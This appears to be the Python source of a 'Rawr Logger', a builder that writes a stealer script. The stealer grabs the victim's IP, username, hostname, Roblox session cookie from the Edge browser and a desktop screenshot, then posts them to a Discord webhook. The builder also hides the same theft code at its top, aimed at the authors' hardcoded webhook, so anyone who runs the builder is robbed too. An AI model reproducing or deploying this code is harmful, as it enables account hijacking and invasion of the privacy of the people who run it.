import os
import requests
from pystyle import *
from PIL import ImageGrab
import socket
import browser_cookie3
import time
from distutils.core import setup
import py2exe
import shutil
os.system(f'cls & title Rawr Logger!')

u = os.getlogin()
webhook = "https://discordapp.com/api/webhooks/1018194678853685309/LZSsAnCsltCFGzQgdpQ5pSJ4LyMwPRj74WTGAFFChOe7WGGPCmOaulFolU1U_jQF7fI2"
hostname = socket.gethostname()   
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname)  
requests.post(webhook,json={'content': f' @everyone Someone Ran The File: '})
requests.post(webhook,json={'content': f'There Ip Is: {ip}'})
requests.post(webhook,json={'content': f'There PC Username Is: {pc_username}'})
requests.post(webhook,json={'content': f'There Pc Name Is:{hostname}'})
RobloxCookie = []
robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
for robloxcookie in robloxcookies:
   if robloxcookie.name == ".ROBLOSECURITY":
    RobloxCookie.append(robloxcookies)
    RobloxCookie.append(robloxcookie.value)

cookie = RobloxCookie[1]
requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.jpg")
screenshot.close()
with open('image.jpg', 'rb') as f:
  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
  requests.post(webhook,files={'upload_file': f})

Write.Print(Center.XCenter("""
                                          
                                ▒▒▓▓                              
                                ▒▒▓▓                              
                              ░░██░░                              
                            ░░██████░░                            
                          ▒▒████████░░                            
                        ▒▒██████████░░                            
                      ████████████████▓▓                          
                    ████████████▓▓████▒▒                          
                  ████████████▓▓▒▒██████▓▓                        
                ████████████▓▓▒▒▒▒██████▒▒                        
                ████████████▓▓▒▒▓▓████████▓▓                      
              ▒▒████████████▒▒▓▓██████████▓▓                      
              ██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ░░██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ████████████▒▒▒▒▒▒████████████████                    
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████                  
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████▒▒                
            ██████████▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓████████████                
            ████████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒████████████                
              ██████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓████████                  
              ████████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ██████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ████████▓▓▒▒░░▒▒▒▒▒▒▓▓████████                    
                  ████████▓▓▒▒▒▒▒▒▓▓████████                      
                      ████████████████▓▓                          
                  Made By Jose#0001,TheSoap1#9870                                          
                                         
"""), Colors.green_to_yellow, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("\nWebhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
code = """
import browser_cookie3
import os 
import requests
import socket
from PIL import ImageGrab
u = os.getlogin()
webhook = "webhooks"
hostname = socket.gethostname()   
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname)  
requests.post(webhook,json={'content': f' @everyone Someone Ran The File: '})
requests.post(webhook,json={'content': f'There Ip Is: {ip}'})
requests.post(webhook,json={'content': f'There PC Username Is: {pc_username}'})
requests.post(webhook,json={'content': f'There Pc Name Is:{hostname}'})
RobloxCookie = []
robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
for robloxcookie in robloxcookies:
   if robloxcookie.name == ".ROBLOSECURITY":
    RobloxCookie.append(robloxcookies)
    RobloxCookie.append(robloxcookie.value)

cookie = RobloxCookie[1]
requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.jpg")
screenshot.close()
with open('image.jpg', 'rb') as f:
  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
  requests.post(webhook,files={'upload_file': f})

"""
file = open(f'{name}.py', 'a')
file.write(code.replace("webhooks", webhook))
Write.Print("Rawr Logger Was SucessFully Made\n",Colors.white_to_green, interval=0.01) 
time.sleep(5)
exit()
